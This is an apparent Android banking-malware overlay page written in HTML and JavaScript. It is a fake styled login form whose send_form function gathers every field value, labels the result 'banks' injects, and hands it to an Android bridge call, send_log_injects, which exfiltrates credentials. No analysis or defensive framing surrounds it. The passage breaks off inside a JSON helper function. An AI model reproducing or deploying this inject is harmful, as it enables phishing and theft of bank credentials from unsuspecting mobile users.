<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>
    <style>html {
	line-height: 1.15;
	-webkit-text-size-adjust: 100%
}

body {
	margin: 0
}

main {
	display: block
}

h1 {
	font-size: 2em;
	margin: .67em 0
}

hr {
	box-sizing: content-box;
	height: 0;
	overflow: visible
}

pre {
	font-family: monospace, monospace;
	font-size: 1em
}

a {
	background-color: transparent
}

abbr[title] {
	border-bottom: none;
	text-decoration: underline;
	text-decoration: underline dotted
}

b,
strong {
	font-weight: bolder
}

code,
kbd,
samp {
	font-family: monospace, monospace;
	font-size: 1em
}

small {
	font-size: 80%
}

sub,
sup {
	font-size: 75%;
	line-height: 0;
	position: relative;
	vertical-align: baseline
}

sub {
	bottom: -.25em
}

sup {
	top: -.5em
}

img {
	border-style: none
}

button,
input,
optgroup,
select,
textarea {
	font-family: inherit;
	font-size: 100%;
	line-height: 1.15;
	margin: 0
}

button,
input {
	overflow: visible
}

button,
select {
	text-transform: none
}

button,
[type="button"],
[type="reset"],
[type="submit"] {
	-webkit-appearance: button
}

button::-moz-focus-inner,
[type="button"]::-moz-focus-inner,
[type="reset"]::-moz-focus-inner,
[type="submit"]::-moz-focus-inner {
	border-style: none;
	padding: 0
}

button:-moz-focusring,
[type="button"]:-moz-focusring,
[type="reset"]:-moz-focusring,
[type="submit"]:-moz-focusring {
	outline: 1px dotted ButtonText
}

fieldset {
	padding: .35em .75em .625em
}

legend {
	box-sizing: border-box;
	color: inherit;
	display: table;
	max-width: 100%;
	padding: 0;
	white-space: normal
}

progress {
	vertical-align: baseline
}

textarea {
	overflow: auto
}

[type="checkbox"],
[type="radio"] {
	box-sizing: border-box;
	padding: 0
}

[type="number"]::-webkit-inner-spin-button,
[type="number"]::-webkit-outer-spin-button {
	height: auto
}

[type="search"] {
	-webkit-appearance: textfield;
	outline-offset: -2px
}

[type="search"]::-webkit-search-decoration {
	-webkit-appearance: none
}

::-webkit-file-upload-button {
	-webkit-appearance: button;
	font: inherit
}

details {
	display: block
}

summary {
	display: list-item
}

template {
	display: none
}

[hidden] {
	display: none
}
body {
    background-color: #ffffff;
}
html {
    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

#template {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
	overflow: hidden;
}
#template .logo {
    text-align: center;
}
#template .content {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
    width: calc(100% - 88px);
    padding: 44px 44px 84px 44px;
    margin-bottom: 28px;
    min-width: 200px;
    overflow: hidden;
}
#template input::placeholder {
    transition: none;
    color: rgba(0,0,0,.42);
}
#template input {
	font-weight: normal;
	color: #2e3035;
	padding: 5px;
	border: 1px solid #b0b0b0;
	top: 65px;
	float: left;
	-webkit-appearance: textfield;
	-moz-appearance: textfield;
	appearance: textfield;
	box-sizing: border-box;
    margin-bottom:1.25em;
    height: 44px;
    width: 100%;
	border-radius: 4px;
    background: #fff;
        background-clip: border-box;
    text-overflow: ellipsis;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;

    font-size: 1em;
    font-family: Helvetica,Arial,sans-serif;
    font-size: 14px;
    font-weight: 400;
    direction: ltr;
}
#template input:focus{
    border: 2px solid #ffe600
}
#template .createtext {
    margin-bottom: 16px;
    font-size: .8125rem;
    color: #262626;
    text-align: left;
}
#template .btnNext {
    border-radius: 4px;
    width: 100%;
    height: 46px;
    margin-top: 16px;
    box-shadow: none;
    display: block;
    line-height: 46px;
    background-color: #ffe600;
    color: black;
    box-sizing: border-box;
    position: relative;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    cursor: pointer;
    outline: 0;
    border: none;
    -webkit-tap-highlight-color: transparent;
    display: inline-block;
    white-space: nowrap;
    text-decoration: none;
    vertical-align: baseline;
    text-align: center;
    min-width: 64px;
    line-height: 36px;
    padding: 0 16px;
    border-radius: 4px;
    overflow: visible;
    transform: translate3d(0,0,0);
}
#template .btnNext:hover {
	border: 1px solid #b0b0b0!important;
    background-color: #fff;
	color: #000;
    outline: 0;
}
#template .btnNext:disabled {
    background-color: #dddddd;
    color: #909090;
}

    <script>
const validators = {
    checklength : function(elem)
    {
        var min_size = elem.getAttribute('validator_min_size') || 7;
        var max_size = elem.getAttribute('validator_max_size') || 25;
        return elem.value.length <= max_size && elem.value.length >= min_size;
    },

    regexvalidator : function ( elem )
    {
        var regex = elem.getAttribute('validator_regex');
        if (!regex)
            return true;
        return (new RegExp(regex) ).test( elem.value );
    }
}

window.onload = function(){
    for( let form of document.forms)
    {
        form.valid_result = {};
        for( var i = 0 ; i < form.length ; i++ )
        {
            var elem = form[i];
            var validator = elem.getAttribute("validator")

            if ( elem.type == "submit" )
            {
                form.submit_btn = elem;
                continue;
            }

            if ( !validator )
                continue;

            form.valid_result[ elem.name] = false;
        }
        console.log("register form", form, form.valid_result);
    }
}
if ( typeof Android == "undefined")
    var Android = {
        returnResult : alert.bind(window)
    }

function validate_form(form)
{
    return true;
}

function send_form(form)
{
    var json = {};
    for( var i = 0 ; i < form.length ; i++ )
    {
        var input = form[i];
        if ( input.type == "submit" )
            continue;
        json[ form[i].name ] = form[i].value;
    }
    json.type_injects = "banks";
    json.closed = "close_activity_injects";
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
       try {
            Android.send_log_injects(JSON.stringify(json))
        } catch (err) {}
    }else {
        alert(JSON.stringify(json));
    }
}

function validate_input(elem)
{
    let validator_name = elem.getAttribute('validator');
    if ( !validators.hasOwnProperty(validator_name))
        return false;
    let validator = validators[ validator_name ];
    elem.form.valid_result[ elem.name ] = validator(elem);

    var is_valid = true;
    for(let valid_res of Object.values(elem.form.valid_result))
        is_valid &= valid_res;
    elem.form.submit_btn.disabled = !is_valid;
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals.join(',') + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
